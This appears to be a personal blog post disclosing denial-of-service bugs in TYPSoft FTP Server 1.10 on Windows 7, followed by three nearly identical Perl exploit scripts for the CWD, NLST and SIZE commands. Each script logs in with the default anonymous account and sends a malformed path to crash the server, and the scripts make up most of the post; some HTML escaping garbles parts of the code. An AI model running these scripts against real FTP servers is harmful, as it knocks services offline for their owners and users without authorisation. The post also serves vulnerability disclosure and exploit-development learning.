---
layout: post
title: "TYPSoft FTP"
date: 2012-02-07
excerpt_separator: <!--more-->
---

During my introduction to exploit development I started work on a small FTP server, see what I can find. What I found is fairly interesting; couple commands resulted in a Denial-of-Service condition under Win 7 x32 and x64. At the time of my research I have been unable to shove some shell code, jump etc into the thing. Time past and I got busy, so it is might still be there.

TL;DR

* TypSoft FTP Server 1.10 (http://sourceforge.net/projects/ftpserv/)
* Requires valid login to exploit
* Affected commands: CWD, NLST, SIZE
* http://www.exploit-db.com/exploits/18469/
* OSVDB-ID: 80913
* Win 7 only
* Update: Recent Win 7 patches in around 2018 fixed the issues and DoS doesn't seems to work. Oops...
<!--more>

**CWD Variant**
{% highlight perl %}

#!/usr/bin/perl
# Exploit Title: Typsoft FTP Server DoS CWD command
# Date: 02/06/2012
# Author: Balazs Makany
# Software Link: http://sourceforge.net/projects/ftpserv/
# Version: 1.10
# Tested on: Windows 7
# (does not work on Windows XP)
#
# Please note, that you need to have a valid username/password 
# to execute the malformed command on the server. The server comes 
# with an enabled by default Anonymous account, which is used below.


use IO::Socket;

$user = "USER anonymous\r\n";
$passw = "PASS anonymous@127.0.0.1\r\n";
$command = "CWD ";
$dos_input = "."x250;
$send = "\r\n";
$socket = IO::Socket::INET-&gt;new(
Proto => "tcp",
PeerAddr => "$ARGV[0]",
PeerPort => "$ARGV[1]",
);

$socket->recv($serverdata, 1024);
print $serverdata;

$socket->send($user);
$socket->recv($serverdata, 1024);
$socket->send($passw);
$socket->recv($serverdata, 1024);
$socket->send($command.$dos_input.$send);

{% endhighlight %}

**NLST Variant**

{% highlight perl %}

#!/usr/bin/perl
# Exploit Title: Typsoft FTP Server DoS NLST command
# Date: 02/06/2012
# Author: Balazs Makany
# Software Link: http://sourceforge.net/projects/ftpserv/
# Version: 1.10
# Tested on: Windows 7 
# (does not work on Windows XP)
#
# Please note, that you need to have a valid username/password 
# to execute the malformed command on the server. The server comes 
# with an enabled by default Anonymous account, which is used below.


use IO::Socket;

$user = "USER anonymous\r\n";
$passw = "PASS anonymous@127.0.0.1\r\n";
$command = "NLST ";
$dos_input = "/.../.../.../.../.../";
$send = "\r\n";
$socket = IO::Socket::INET-&gt;new(
Proto =>; "tcp",
PeerAddr => "$ARGV[0]",
PeerPort => "$ARGV[1]",
);

$socket->recv($serverdata, 1024);
print $serverdata;

$socket->send($user);
$socket->recv($serverdata, 1024);
$socket->send($passw);
$socket->recv($serverdata, 1024);
$socket->send($command.$dos_input.$send);

{% endhighlight %}

**SIZE variant**

{% highlight perl %}

#!/usr/bin/perl
# Exploit Title: Typsoft FTP Server DoS SIZE command
# Date: 02/06/2012
# Author: Balazs Makany
# Software Link: http://sourceforge.net/projects/ftpserv/
# Version: 1.10
# Tested on: Windows 7
# (does not work on Windows XP)
#
# Please note, that you need to have a valid username/password 
# to execute the malformed command on the server. The server comes 
# with an enabled by default Anonymous account, which is used below.>


use IO::Socket;

$user = "USER anonymous\r\n";
$passw = "PASS anonymous@127.0.0.1\r\n";
$command = "SIZE ";
$dos_input = "/.../.../.../.../.../";
$send = "\r\n";
$socket = IO::Socket::INET-&gt;new(
Proto =&gt; "tcp",
PeerAddr =&gt; "$ARGV[0]",
PeerPort =&gt; "$ARGV[1]",
);

$socket-&gt;recv($serverdata, 1024);
print $serverdata;

$socket-&gt;send($user);
$socket-&gt;recv($serverdata, 1024);
$socket-&gt;send($passw);
$socket-&gt;recv($serverdata, 1024);
$socket-&gt;send($command.$dos_input.$send);

{% endhighlight %}
